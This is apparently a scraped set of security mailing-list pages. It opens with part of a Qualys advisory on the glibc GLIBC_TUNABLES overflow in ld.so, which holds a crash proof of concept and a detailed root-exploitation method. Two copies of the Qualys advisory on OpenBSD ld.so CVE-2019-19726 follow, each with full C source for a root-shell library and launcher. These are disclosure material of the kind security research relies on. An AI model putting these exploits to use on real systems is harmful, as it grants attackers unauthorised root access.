242               tunable_initialize (cur, value);
243               break;
244             }
245         }
246
247       if (p[len] != '\0')
248         p += len + 1;
249     }
250 }
------------------------------------------------------------------------

Unfortunately, if a GLIBC_TUNABLES environment variable is of the form
"tunable1=tunable2=AAA" (where "tunable1" and "tunable2" are SXID_IGNORE
tunables, for example "glibc.malloc.mxfast"), then:

- during the first iteration of the "while (true)" in parse_tunables(),
  the entire "tunable1=tunable2=AAA" is copied in-place to tunestr (at
  lines 221-235), thus filling up tunestr;

- at lines 247-248, p is not incremented (p[len] is '\0' because no ':'
  was found at lines 203-204) and therefore p still points to the value
  of "tunable1", i.e. "tunable2=AAA";

- during the second iteration of the "while (true)" in parse_tunables(),
  "tunable2=AAA" is appended (as if it were a second tunable) to tunestr
  (which is already full), thus overflowing tunestr.

A note on fuzzing: although we discovered this buffer overflow manually,
we later tried to fuzz the vulnerable function, parse_tunables(); both
AFL++ and libFuzzer re-discovered this overflow in less than a second,
when provided with a dictionary of tunables (which can be compiled by
running "ld.so --list-tunables").

========================================================================
Proof of concept
========================================================================

$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
Segmentation fault (core dumped)

========================================================================
Exploitation
========================================================================

This vulnerability is a straightforward buffer overflow, but what should
we overwrite to achieve arbitrary code execution? The buffer we overflow
is allocated at line 284 by tunables_strdup(), a re-implementation of
strdup() that uses ld.so's __minimal_malloc() instead of the glibc's
malloc() (indeed, the glibc's malloc() has not been initialized yet).
This __minimal_malloc() implementation simply calls mmap() to obtain
more memory from the kernel.

The question, then, is: what writable pages can we overwrite in the mmap
region? To the best of our knowledge, we have only two options (because
this buffer overflow takes place at the very beginning of ld.so's
execution):

1/ The read-write ELF segment of ld.so itself (the first pages of this
read-write segment are actually ld.so's RELRO segment, but they have not
been mprotect()ed read-only yet):

------------------------------------------------------------------------
7f209f367000-7f209f369000 r--p 00000000 fd:00 10943                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f209f369000-7f209f393000 r-xp 00002000 fd:00 10943                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f209f393000-7f209f39e000 r--p 0002c000 fd:00 10943                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f209f39f000-7f209f3a3000 rw-p 00037000 fd:00 10943                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
------------------------------------------------------------------------

However, on all the Linux distributions that we checked, the unmapped
hole immediately below ld.so's read-write segment is at most one page,
but ld.so's __minimal_malloc() always allocates at least two pages ("one
extra page to reduce number of mmap calls"). In other words, the buffer
we overflow cannot be allocated immediately below ld.so's read-write
segment, and therefore cannot overwrite this segment.

2/ Our only option, then, is to overwrite mmap()ed pages that were
allocated by tunables_strdup() itself: because __tunables_init() can
process multiple GLIBC_TUNABLES environment variables, and because the
Linux kernel's mmap() is a top-down allocator, we can mmap() a first
GLIBC_TUNABLES (without overflowing it), mmap() a second GLIBC_TUNABLES
(immediately below the first one) and overflow it, thus overwriting the
first GLIBC_TUNABLES. As a result, we can:

- either replace this first GLIBC_TUNABLES with a completely different
  environment variable, for example LD_PRELOAD or LD_LIBRARY_PATH -- but
  these dangerous variables are later removed from the environment by
  ld.so (in process_envvars()), and such a replacement would therefore
  be useless;

- or replace the first GLIBC_TUNABLES with a GLIBC_TUNABLES that
  contains dangerous (SXID_ERASE) tunables, which were previously
  removed by parse_tunables() -- although this seems promising at first,
  exploiting such a replacement would require a SUID-root program that
  setuid(0)s and execve()s another program with a preserved environment
  (to process the dangerous GLIBC_TUNABLES as root, but without
  __libc_enable_secure).

  Alas, we do not know of such a SUID-root program on Linux (on OpenBSD,
  /usr/bin/chpass setuid(0)s and execv()s /usr/sbin/pwd_mkdb, and was
  exploited in CVE-2019-19726); if you, dear reader, know of such a
  SUID-root program on Linux, please let us know!

At that point, the situation looked quite hopeless, but a comment in
ld.so's _dl_new_object() (which is called long after __tunables_init())
caught our attention (at line 105):

------------------------------------------------------------------------
 56 struct link_map *
 57 _dl_new_object (char *realname, const char *libname, int type,
 58                 struct link_map *loader, int mode, Lmid_t nsid)
 59 {
 ..
 84   struct link_map *new;
 85   struct libname_list *newname;
 ..
 92   new = (struct link_map *) calloc (sizeof (*new) + audit_space
 93                                     + sizeof (struct link_map *)
 94                                     + sizeof (*newname) + libname_len, 1);
 95   if (new == NULL)
 96     return NULL;
 97
 98   new->l_real = new;
 99   new->l_symbolic_searchlist.r_list = (struct link_map **) ((char *) (new + 1)
100                                                             + audit_space);
101
102   new->l_libname = newname
103     = (struct libname_list *) (new->l_symbolic_searchlist.r_list + 1);
104   newname->name = (char *) memcpy (newname + 1, libname, libname_len);
105   /* newname->next = NULL;      We use calloc therefore not necessary.  */
------------------------------------------------------------------------

ld.so allocates the memory for this link_map structure with calloc(),
and therefore does not explicitly initialize various of its members to
zero; this is a reasonable optimization. As mentioned earlier, calloc()
here is not the glibc's calloc() but ld.so's __minimal_calloc(), which
calls __minimal_malloc() *without* explicitly initializing the memory it
returns to zero; this is also a reasonable optimization, because for all
intents and purposes __minimal_malloc() always returns a clean chunk of
mmap()ed memory, which is guaranteed to be initialized to zero by the
kernel.

Unfortunately, the buffer overflow in parse_tunables() allows us to
overwrite clean mmap()ed memory with non-zero bytes, thereby overwriting
pointers of the soon-to-be-allocated link_map structure with non-NULL
values. This allows us to completely break the logic of ld.so, which
assumes that these pointers are NULL.

We first tried to exploit this buffer overflow by overwriting the
link_map structure's l_next and l_prev pointers (a doubly linked list of
link_map structures), but we failed because of two assert()ion failures
in setup_vdso(), which immediately abort() ld.so (all the distributions
that we checked compile their glibc, and hence ld.so, with assert()ions
enabled):

------------------------------------------------------------------------
 96       assert (l->l_next == NULL);
 97       assert (l->l_prev == main_map);
------------------------------------------------------------------------

We then realized that many more pointers in the link_map structure are
not explicitly initialized to NULL; in particular, the pointers to
Elf64_Dyn structures in the l_info[] array of pointers. Among these,
l_info[DT_RPATH], the "Library search path", immediately stood out: if
we overwrite this pointer and control where and what it points to, then
we can force ld.so to trust a directory that we own, and therefore to
load our own libc.so.6 or LD_PRELOAD library from this directory, and
execute arbitrary code (as root, if we run ld.so through a SUID-root
program).

------------------------------------------------------------------------

Where should the overwritten l_info[DT_RPATH] point to? The easy answer
to this question is: the stack; more precisely, our environment strings
in the stack. On Linux, the stack is randomized in a 16GB region, and
our environment strings can occupy up to 6MB (_STK_LIM / 4 * 3, in the
kernel's bprm_stack_limits()): after 16GB / 6MB = 2730 tries we have a
good chance of guessing the address of our environment strings (in our
exploit, we always overwrite l_info[DT_RPATH] with 0x7ffdfffff010, the
center of the randomized stack region). In our tests, this brute force
takes ~30s on Debian, and ~5m on Ubuntu and Fedora (because of their
automatic crash handlers, Apport and ABRT; we have not tried to work
around this slowdown).

------------------------------------------------------------------------

What should the overwritten l_info[DT_RPATH] point to? In other words,
what should we store in our 6MB of environment strings? l_info[DT_RPATH]
is a pointer to a small (16B) Elf64_Dyn structure:

- an int64_t d_tag, which should be DT_RPATH (15), but this value is
  never actually checked anywhere, so we can store anything there;

- a uint64_t d_val, which is an offset into the ELF string table of the
  SUID-root program that is being executed (this offset references a
  string that is the "Library search path" itself).

In our exploit, we simply fill our 6MB of environment strings with
0xfffffffffffffff8 (-8), because at an offset of -8B below the string
table of most SUID-root programs, the string "\x08" appears: this forces
ld.so to trust a relative directory named "\x08" (in our current working
directory), and therefore allows us to load and execute our own
libc.so.6 or LD_PRELOAD library from this directory, as root.

------------------------------------------------------------------------

One major problem remains unsolved, however: to avoid the kind of
assert()ion failures mentioned earlier (when we tried to overwrite the
l_next and l_prev pointers of the link_map structure), we must overwrite
the soon-to-be-allocated link_map structure with NULL pointers only
(except l_info[DT_RPATH], of course); but intuitively, the ability to
overflow a buffer with a large number of null bytes while parsing a
null-terminated C string sounds quite unusual.

Luckily for us attackers, the bytes that are written out-of-bounds by
parse_tunables() are also read out-of-bounds (at line 234), but not from
the mmap()ed copy of our GLIBC_TUNABLES environment variable (tunestr),
but from our original GLIBC_TUNABLES environment variable in the stack
(valstring, at line 200). Consequently, if we store a large number of
empty strings (null bytes) immediately after our GLIBC_TUNABLES in the
stack, followed by the string "\x10\xf0\xff\xff\xfd\x7f", followed by
more empty strings (null bytes), then we safely overwrite the link_map
structure with null bytes (NULL pointers), except for l_info[DT_RPATH]
(which we overwrite with 0x7ffdfffff010, which points to our own
Elf64_Dyn structures in the stack with a probability of 1/2730).

Final note: the exploitation method described in this advisory works
against almost all of the SUID-root programs that are installed by
default on Linux; a few exceptions are:

- sudo on all distributions, because it specifies its own ELF RUNPATH
  (/usr/libexec/sudo), which overrides our l_info[DT_RPATH];

- chage and passwd on Fedora, because they are protected by special
  SELinux rules;

- snap-confine on Ubuntu, because it is protected by special AppArmor
  rules.

Last-minute note: although glibc 2.34 is vulnerable to this buffer
overflow, its tunables_strdup() uses __sbrk(), not __minimal_malloc()
(which was introduced in glibc 2.35 by commit b05fae, "elf: Use the
minimal malloc on tunables_strdup"); we have not yet investigated
whether glibc 2.34 is exploitable or not.

========================================================================
Acknowledgments
========================================================================

We thank Red Hat Product Security, Siddhesh Poyarekar, the members of
linux-distros@...nwall, Salvatore Bonaccorso, and Solar Designer.

========================================================================
Timeline
========================================================================

2023-09-04: Advisory and exploit sent to secalert@...hat.

2023-09-19: Advisory and patch sent to linux-distros@...nwall.

2023-10-03: Coordinated Release Date (17:00 UTC).

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_5f294786_20250120_232834.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](../../../2019/12/12/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20191211210637.GE26987@localhost.localdomain>
Date: Wed, 11 Dec 2019 21:15:43 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Local Privilege Escalation in OpenBSD's dynamic loader
 (CVE-2019-19726)

Qualys Security Advisory

Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)

==============================================================================
Contents
==============================================================================

Summary
Analysis
Demonstration
Acknowledgments

==============================================================================
Summary
==============================================================================

We discovered a Local Privilege Escalation in OpenBSD's dynamic loader
(ld.so): this vulnerability is exploitable in the default installation
(via the set-user-ID executable chpass or passwd) and yields full root
privileges.

We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release), 6.5, 6.2, and 6.1, on both
amd64 and i386; other releases and architectures are probably also
exploitable.

==============================================================================
Analysis
==============================================================================

In this section, we analyze a step-by-step execution of our proof of
concept:

------------------------------------------------------------------------------

1/ We execve() the set-user-ID /usr/bin/chpass, but first:

   1a/ we set the LD_LIBRARY_PATH environment variable to one single dot
   (the current working directory) and approximately ARG_MAX colons (the
   maximum number of bytes for the argument and environment list); as
   described in man ld.so:

     LD_LIBRARY_PATH
             A colon separated list of directories, prepending the default
             search path for shared libraries.  This variable is ignored for
             set-user-ID and set-group-ID executables.

   1b/ we set the RLIMIT_DATA resource limit to ARG_MAX * sizeof(char *)
   (2MB on amd64, 1MB on i386); as described in man setrlimit:

     RLIMIT_DATA     The maximum size (in bytes) of the data segment for a
                     process; this includes memory allocated via malloc(3) and
                     all other anonymous memory mapped via mmap(2).

------------------------------------------------------------------------------

2/ Before the main() function of chpass is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():

262 void
263 _dl_setup_env(const char *argv0, char **envp)
264 {
...
271         _dl_libpath = _dl_split_path(_dl_getenv("LD_LIBRARY_PATH", envp));
...
283         _dl_trust = !_dl_issetugid();
284         if (!_dl_trust) {       /* Zap paths if s[ug]id... */
285                 if (_dl_libpath) {
286                         _dl_free_path(_dl_libpath);
287                         _dl_libpath = NULL;
288                         _dl_unsetenv("LD_LIBRARY_PATH", envp);
289                 }

------------------------------------------------------------------------------

3/ At line 271, _dl_getenv() returns a pointer to our LD_LIBRARY_PATH
environment variable and passes it to _dl_split_path():

 23 char **
 24 _dl_split_path(const char *searchpath)
 25 {
 ..
 35         pp = searchpath;
 36         while (*pp) {
 37                 if (*pp == ':' || *pp == ';')
 38                         count++;
 39                 pp++;
 40         }
 ..
 45         retval = _dl_reallocarray(NULL, count, sizeof(*retval));
 46         if (retval == NULL)
 47                 return (NULL);

------------------------------------------------------------------------------

4/ At line 45, count is approximately ARG_MAX (the number of colons in
our LD_LIBRARY_PATH) and _dl_reallocarray() returns NULL (because of our
low RLIMIT_DATA); at line 47, _dl_split_path() returns NULL.

------------------------------------------------------------------------------

5/ As a result, _dl_libpath is NULL (line 271) and our LD_LIBRARY_PATH
is ignored, but it is not deleted from the environment (CVE-2019-19726):
although _dl_trust is false (_dl_issetugid() returns true because chpass
is set-user-ID), _dl_unsetenv() is not called (line 288) because
_dl_libpath is NULL (line 285).

------------------------------------------------------------------------------

6/ Next, the main() function of chpass is executed, and it:

   6a/ calls setuid(0), which sets the real and effective user IDs to 0;

   6b/ calls pw_init(), which resets RLIMIT_DATA to RLIM_INFINITY;

   6c/ calls pw_mkdb(), which vfork()s and execv()s /usr/sbin/pwd_mkdb
   (unlike execve(), execv() does not reset the environment).

------------------------------------------------------------------------------

7/ Before the main() function of pwd_mkdb is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():

   7a/ at line 271, _dl_getenv() returns a pointer to our
   LD_LIBRARY_PATH environment variable (because it was not deleted from
   the environment in step 5, and because execv() did not reset the
   environment in step 6c);

   7b/ at line 45, _dl_reallocarray() does not return NULL anymore
   (because our low RLIMIT_DATA was reset in step 6b);

   7c/ as a result, _dl_libpath is not NULL (line 271), and it is not
   reset to NULL (line 287) because _dl_trust is true (_dl_issetugid()
   returns false because pwd_mkdb is not set-user-ID, and because the
   real and effective user IDs were both set to 0 in step 6a): our
   LD_LIBRARY_PATH is not ignored anymore.

------------------------------------------------------------------------------

8/ Finally, ld.so searches for shared libraries in _dl_libpath (our
LD_LIBRARY_PATH) and loads our own library from the current working
directory (the dot in our LD_LIBRARY_PATH).

------------------------------------------------------------------------------

==============================================================================
Demonstration
==============================================================================

In this section, we demonstrate the use of our proof of concept:

------------------------------------------------------------------------------

$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > lib.c << "EOF"
#include <paths.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    if (setuid(0) != 0) _exit(__LINE__);
    if (setgid(0) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ readelf -a /usr/sbin/pwd_mkdb | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libutil.so.13.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.95.1]

$ gcc -fpic -shared -s -o libutil.so.13.1 lib.c

$ cat > poc.c << "EOF"
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>

int
main(int argc, char * const * argv)
{
    #define LLP "LD_LIBRARY_PATH=."
    static char llp[ARG_MAX - 128];
    memset(llp, ':', sizeof(llp)-1);
    memcpy(llp, LLP, sizeof(LLP)-1);
    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };

    #define DATA (ARG_MAX * sizeof(char *))
    const struct rlimit data = { DATA, DATA };
    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);

    if (argc <= 1) _exit(__LINE__);
    argv += 1;
    execve(argv[0], argv, envp);
    _exit(__LINE__);
}
EOF

$ gcc -s -o poc poc.c

$ ./poc /usr/bin/chpass

# id
uid=0(root) gid=0(wheel) groups=32767(nobody)

------------------------------------------------------------------------------

==============================================================================
Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published a patch for this vulnerability in less
than 3 hours. We also thank MITRE's CVE Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from packetstormsecurity.com_7eb57f38_20250120_232831.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from seclists.org_89828f27_20250120_232832.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](32)

![](/shared/images/nst-icons.svg#search)

# Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)

---

*From*: Qualys Security Advisory <qsa () qualys com>

*Date*: Wed, 11 Dec 2019 21:38:40 +0000

---

```

Qualys Security Advisory

Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)

==============================================================================
Contents
==============================================================================

Summary
Analysis
Demonstration
Acknowledgments

==============================================================================
Summary
==============================================================================

We discovered a Local Privilege Escalation in OpenBSD's dynamic loader
(ld.so): this vulnerability is exploitable in the default installation
(via the set-user-ID executable chpass or passwd) and yields full root
privileges.

We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release), 6.5, 6.2, and 6.1, on both
amd64 and i386; other releases and architectures are probably also
exploitable.

==============================================================================
Analysis
==============================================================================

In this section, we analyze a step-by-step execution of our proof of
concept:

------------------------------------------------------------------------------

1/ We execve() the set-user-ID /usr/bin/chpass, but first:

   1a/ we set the LD_LIBRARY_PATH environment variable to one single dot
   (the current working directory) and approximately ARG_MAX colons (the
   maximum number of bytes for the argument and environment list); as
   described in man ld.so:

     LD_LIBRARY_PATH
             A colon separated list of directories, prepending the default
             search path for shared libraries.  This variable is ignored for
             set-user-ID and set-group-ID executables.

   1b/ we set the RLIMIT_DATA resource limit to ARG_MAX * sizeof(char *)
   (2MB on amd64, 1MB on i386); as described in man setrlimit:

     RLIMIT_DATA     The maximum size (in bytes) of the data segment for a
                     process; this includes memory allocated via malloc(3) and
                     all other anonymous memory mapped via mmap(2).

------------------------------------------------------------------------------

2/ Before the main() function of chpass is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():

262 void
263 _dl_setup_env(const char *argv0, char **envp)
264 {
...
271         _dl_libpath = _dl_split_path(_dl_getenv("LD_LIBRARY_PATH", envp));
...
283         _dl_trust = !_dl_issetugid();
284         if (!_dl_trust) {       /* Zap paths if s[ug]id... */
285                 if (_dl_libpath) {
286                         _dl_free_path(_dl_libpath);
287                         _dl_libpath = NULL;
288                         _dl_unsetenv("LD_LIBRARY_PATH", envp);
289                 }

------------------------------------------------------------------------------

3/ At line 271, _dl_getenv() returns a pointer to our LD_LIBRARY_PATH
environment variable and passes it to _dl_split_path():

 23 char **
 24 _dl_split_path(const char *searchpath)
 25 {
 ..
 35         pp = searchpath;
 36         while (*pp) {
 37                 if (*pp == ':' || *pp == ';')
 38                         count++;
 39                 pp++;
 40         }
 ..
 45         retval = _dl_reallocarray(NULL, count, sizeof(*retval));
 46         if (retval == NULL)
 47                 return (NULL);

------------------------------------------------------------------------------

4/ At line 45, count is approximately ARG_MAX (the number of colons in
our LD_LIBRARY_PATH) and _dl_reallocarray() returns NULL (because of our
low RLIMIT_DATA); at line 47, _dl_split_path() returns NULL.

------------------------------------------------------------------------------

5/ As a result, _dl_libpath is NULL (line 271) and our LD_LIBRARY_PATH
is ignored, but it is not deleted from the environment (CVE-2019-19726):
although _dl_trust is false (_dl_issetugid() returns true because chpass
is set-user-ID), _dl_unsetenv() is not called (line 288) because
_dl_libpath is NULL (line 285).

------------------------------------------------------------------------------

6/ Next, the main() function of chpass is executed, and it:

   6a/ calls setuid(0), which sets the real and effective user IDs to 0;

   6b/ calls pw_init(), which resets RLIMIT_DATA to RLIM_INFINITY;

   6c/ calls pw_mkdb(), which vfork()s and execv()s /usr/sbin/pwd_mkdb
   (unlike execve(), execv() does not reset the environment).

------------------------------------------------------------------------------

7/ Before the main() function of pwd_mkdb is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():

   7a/ at line 271, _dl_getenv() returns a pointer to our
   LD_LIBRARY_PATH environment variable (because it was not deleted from
   the environment in step 5, and because execv() did not reset the
   environment in step 6c);

   7b/ at line 45, _dl_reallocarray() does not return NULL anymore
   (because our low RLIMIT_DATA was reset in step 6b);

   7c/ as a result, _dl_libpath is not NULL (line 271), and it is not
   reset to NULL (line 287) because _dl_trust is true (_dl_issetugid()
   returns false because pwd_mkdb is not set-user-ID, and because the
   real and effective user IDs were both set to 0 in step 6a): our
   LD_LIBRARY_PATH is not ignored anymore.

------------------------------------------------------------------------------

8/ Finally, ld.so searches for shared libraries in _dl_libpath (our
LD_LIBRARY_PATH) and loads our own library from the current working
directory (the dot in our LD_LIBRARY_PATH).

------------------------------------------------------------------------------

==============================================================================
Demonstration
==============================================================================

In this section, we demonstrate the use of our proof of concept:

------------------------------------------------------------------------------

$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > lib.c << "EOF"
#include <paths.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    if (setuid(0) != 0) _exit(__LINE__);
    if (setgid(0) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ readelf -a /usr/sbin/pwd_mkdb | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libutil.so.13.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.95.1]

$ gcc -fpic -shared -s -o libutil.so.13.1 lib.c

$ cat > poc.c << "EOF"
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>

int
main(int argc, char * const * argv)
{
    #define LLP "LD_LIBRARY_PATH=."
    static char llp[ARG_MAX - 128];
    memset(llp, ':', sizeof(llp)-1);
    memcpy(llp, LLP, sizeof(LLP)-1);
    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };

    #define DATA (ARG_MAX * sizeof(char *))
    const struct rlimit data = { DATA, DATA };
    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);

    if (argc <= 1) _exit(__LINE__);
    argv += 1;
    execve(argv[0], argv, envp);
    _exit(__LINE__);
}
EOF

$ gcc -s -o poc poc.c

$ ./poc /usr/bin/chpass

# id
uid=0(root) gid=0(wheel) groups=32767(nobody)

------------------------------------------------------------------------------

==============================================================================
Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published a patch for this vulnerability in less
than 3 hours. We also thank MITRE's CVE Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to
advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read,
copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that
all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service
providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate
unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](32)

### Current thread:

* **Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)** *Qualys Security Advisory (Dec 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from nmap.org_b89a31d3_20250121_013339.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

* [Nmap Network Scanning](toc.html)
